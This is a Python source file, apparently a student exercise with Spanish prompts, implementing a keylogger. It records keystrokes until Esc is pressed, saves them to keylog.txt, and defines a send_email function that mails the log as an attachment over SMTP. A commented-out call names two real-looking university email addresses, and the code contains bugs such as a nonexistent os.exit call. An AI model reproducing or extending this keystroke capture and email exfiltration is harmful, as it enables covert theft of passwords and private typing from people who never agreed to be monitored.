import keyboard
import smtplib
import yagmail
import os


# impl fea xd
# class KeyLogger():
#     def __init__(self, save_log, send_log):
#         self.SMTPKEY = os.environ.get('SMTP-PASS')
#         self.log = ""
#         self.save = save_log
#         self.send = send_log

#     def callback(self, event):
#         name = event.name
#         match name:
#             case "space":
#                 name = " "
#             case "enter":
#                 name = "[ENTER]\n"
#             case _:
#                 pass

#         self.log += name

#     def write_log(self):
#         with open('keylog.txt', 'w') as target:
#             target.write(self.log)

#     def run(self):
#         while True:
#             if keyboard.is_pressed('esc'):
#                 break
#             keyboard.on_release(self.callback)

#         self.write_log()

def output(event_name):
    with open('keylog.txt', 'w') as f:
        for l in event_name:
            f.write(f"{l}\n")

def callback(event):
    print(event.name)
    output(event.name)

def send_email(sender_email , receiver_email ,password):
    yag = yagmail.SMTP(sender_email, password)
    yag.send(to=receiver_email, subject='Registros de Keylogger', contents='Se adjunta el archivo de registros', attachments='keylog.txt')

def record_keys():
    events = keyboard.record('esc')
    return events

def main():
    save_output = False
    send_file   = False

    print("---------------------------------")
    print("---------- KeyLogger ------------")
    print("---------------------------------")
    respuesta_email = input("¿Deseas enviar los registros por email? (yes/no): ")
    respuesta_guardar = input("¿Deseas guardar los registros en texto plano? (yes/no): ")

    if respuesta_email.lower() in ['yes', 'y']:
        send_file = True

    if respuesta_guardar.lower() in ['yes', 'y']:
        save_output = True
        #send_email("Paola_VB@ciencias.unam.mx", "janet1204@ciencias.unam.mx", "pass")

    if respuesta_email.lower() in ['no', 'n'] and respuesta_guardar.lower() in ['no', 'n']:
        print("Interrumpiendo la ejecución del programa...")
        os.exit(0)

    events = record_keys()
    parsed = keyboard.get_typed_strings(events)
    if save_output:
        output(parsed)
    elif send_file:
        pass # logica de SMTP


if __name__ == "__main__":
    main()
